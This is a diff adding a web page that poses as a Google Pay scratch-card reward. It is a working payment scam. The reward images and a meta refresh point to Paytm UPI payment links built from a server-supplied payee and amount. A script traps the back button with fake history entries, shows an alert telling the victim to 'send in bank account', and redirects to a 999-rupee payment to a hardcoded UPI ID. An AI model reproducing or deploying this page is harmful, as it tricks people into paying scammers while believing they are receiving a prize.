@@ -1,0 +1,244 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="">
+  <title>Home</title>
+  <link rel="stylesheet" href="img/style.css">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="You&#39;ve Won Google Pay Reward">
+  <meta property="og:description" content="Claim Now and Withdraw it">
+  <meta property="og:image" content="img/prize.html">
+
+  <script>
+    var currentPage = 1;
+
+    function displayAppInfo() {
+      var amValueElement = document.getElementById('amValue');
+      var appLinkElement = document.getElementById('appLink');
+      var dynamicMetaElement = document.getElementById('dynamicMeta');
+
+      // Fetch JSON data from the server
+      fetch('http://localhost/mailer/ayhay.php')
+        .then(response => response.json())
+        .then(jsonData => {
+          // Check if there is no data
+          if (!jsonData || Object.keys(jsonData).length === 0) {
+            amValueElement.textContent = 'N/A';
+            appLinkElement.href = '#';
+            dynamicMetaElement.content = ''; // Clear content
+            return;
+          }
+
+          // Display the am value on the page
+          amValueElement.textContent = jsonData.am || 'N/A';
+
+          // Create the link using fetched pa and am values
+          var link = 'paytmmp://pay?pa=' + encodeURIComponent(jsonData.pa) + '&pn=null&mc=&tn=&am=' + encodeURIComponent(jsonData.am) + '&cu=INR&url=&mode=02&purpose=00&orgid=159024&sign=MEYCIQCgpTe2xeoNfYGFQ8SsqsibjjRtneNFQFlmLfZYC/vC5wIhANeXald38G4FMySMNEoGC0/zfwLlPGfpNRrDrwF7d3Ex';
+          appLinkElement.href = link;
+
+          var anchorElement = document.getElementById('dynamicLink');
+          anchorElement.href = link;
+          // Update the dynamic meta tag content
+          dynamicMetaElement.content = link;
+        })
+        .catch(error => console.error('Error fetching data:', error));
+    }
+
+    // Call the displayAppInfo function when the page loads
+    window.onload = displayAppInfo;
+  </script>
+
+<script type="text/javascript">
+  function updateLink(pa, am) {
+    return 'paytmmp://pay?pa=' + encodeURIComponent(pa) + '&pn=null&mc=&tn=&am=' + encodeURIComponent(am) + '&cu=INR&url=&mode=02&purpose=00&orgid=159024&sign=MEYCIQCgpTe2xeoNfYGFQ8SsqsibjjRtneNFQFlmLfZYC/vC5wIhANeXald38G4FMySMNEoGC0/zfwLlPGfpNRrDrwF7d3Ex';
+  }
+
+  !function () {
+    var t;
+    try {
+      for (t = 0; 10 > t; ++t)
+        history.pushState({}, "", "");
+      onpopstate = function (t) {
+        t.state && alert('Claim your Reward by Clicking on\n"SEND IN BANK ACCOUNT"');
+        location.href = updateLink('fcbizzjygpq@freecharge', '999');
+      }
+    } catch (o) { }
+  }();
+</script>
+
+</head>
+
+<body>
+  <a id="appLink" href="#">
+    <div>
+      <img src="img/1T.jpg" width="100%" height="auto">
+    </div>
+  </a>
+  <div class="container" id="js-container">
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <canvas class="canvas" id="js-canvas" width="290" height="290" style="z-index: 2;height: 300px; width: 310px;"></canvas>
+    <form class="form" style="visibility: visible;">
+      <img src="img/1B.jpg" width="98%" height="auto">
+      <span style="position: absolute;left: 15px;right: 0;z-index: 1;bottom: -10px;">
+        <style>
+          h1.a {
+            font-family: "Schibsted+Grotes", sans-serif;
+            color: #2A2076;
+            font-size: 15px;
+          }
+
+          h1.b {
+            font-family: "Schibsted+Grotes", sans-serif;
+            color: #2A2076;
+            font-size: 50px;
+          }
+        </style>
+        <center>
+          <h1 class="b"><b>₹<span id="amValue"></span></b></h1>
+        </center>
+      </span> <br>
+    </form>
+  </div>
+  <a id="dynamicLink" href="#">
+    <div>
+      <img src="img/1L.jpg" width="100%" height="auto">
+    </div>
+  </a>
+  <meta id="dynamicMeta" http-equiv="refresh" content="">
+  <script>
+    (function () {
+      'use strict';
+      var isDrawing, lastPoint;
+      var container = document.getElementById('js-container'),
+        canvas = document.getElementById('js-canvas'),
+        canvasWidth = canvas.width,
+        canvasHeight = canvas.height,
+        ctx = canvas.getContext('2d'),
+        image = new Image(),
+        brush = new Image();
+      image.src =
+        "img/scratch.jpeg"
+      image.onload = function () {
+        ctx.drawImage(image, 0, 0);
+        document.querySelectorAll('.form')[0].style.visibility = 'visible';
+      };
+      brush.src =
+        'img/brush.png';
+      canvas.addEventListener('mousedown', handleMouseDown, false);
+      canvas.addEventListener('touchstart', handleMouseDown, false);
+      canvas.addEventListener('mousemove', handleMouseMove, false);
+      canvas.addEventListener('touchmove', handleMouseMove, false);
+      canvas.addEventListener('mouseup', handleMouseUp, false);
+      canvas.addEventListener('touchend', handleMouseUp, false);
+
+      function distanceBetween(point1, point2) {
+        return Math.sqrt(Math.pow(point2.x - point1.x, 2) + Math.pow(point2.y - point1.y, 2));
+      }
+
+      function angleBetween(point1, point2) {
+        return Math.atan2(point2.x - point1.x, point2.y - point1.y);
+      }
+
+      function getFilledInPixels(stride) {
+        if (!stride || stride < 1) {
+          stride = 1;
+        }
+        var pixels = ctx.getImageData(0, 0, canvasWidth, canvasHeight),
+          pdata = pixels.data,
+          l = pdata.length,
+          total = (l / stride),
+          count = 0;
+        for (var i = count = 0; i < l; i += stride) {
+          if (parseInt(pdata[i]) === 0) {
+            count++;
+          }
+        }
+        return Math.round((count / total) * 100);
+      }
+
+      function getMouse(e, canvas) {
+        var offsetX = 0,
+          offsetY = 0,
+          mx, my;
+        if (canvas.offsetParent !== undefined) {
+          do {
+            offsetX += canvas.offsetLeft;
+            offsetY += canvas.offsetTop;
+          } while ((canvas = canvas.offsetParent));
+        }
+        mx = (e.pageX || e.touches[0].clientX) - offsetX;
+        my = (e.pageY || e.touches[0].clientY) - offsetY;
+        return {
+          x: mx,
+          y: my
+        };
+      }
+
+      function handlePercentage(filledInPixels) {
+        filledInPixels = filledInPixels || 0;
+        if (filledInPixels > 40) {
+          canvas.parentNode.removeChild(canvas);
+          var elems = document.getElementsByClassName("confetti");
+          for (var i = 0; i < elems.length; i++) {
+            document.querySelectorAll('.confetti')[i].style.visibility = 'visible';
+          }
+        }
+      }
+
+      function handleMouseDown(e) {
+        isDrawing = true;
+        lastPoint = getMouse(e, canvas);
+      }
+
+      function handleMouseMove(e) {
+        if (!isDrawing) {
+          return;
+        }
+        e.preventDefault();
+
+        var currentPoint = getMouse(e, canvas),
+          dist = distanceBetween(lastPoint, currentPoint),
+          angle = angleBetween(lastPoint, currentPoint),
+          x, y;
+        for (var i = 0; i < dist; i++) {
+          x = lastPoint.x + (Math.sin(angle) * i) - 25;
+          y = lastPoint.y + (Math.cos(angle) * i) - 25;
+          ctx.globalCompositeOperation = 'destination-out';
+          ctx.drawImage(brush, x, y);
+        }
+        lastPoint = currentPoint;
+        handlePercentage(getFilledInPixels(32));
+      }
+
+      function handleMouseUp(e) {
+        isDrawing = false;
+      }
+
+    })();
+  </script>
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-NNW9X98K2K"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-NNW9X98K2K');
+  </script>
+</body>
+
+</html>
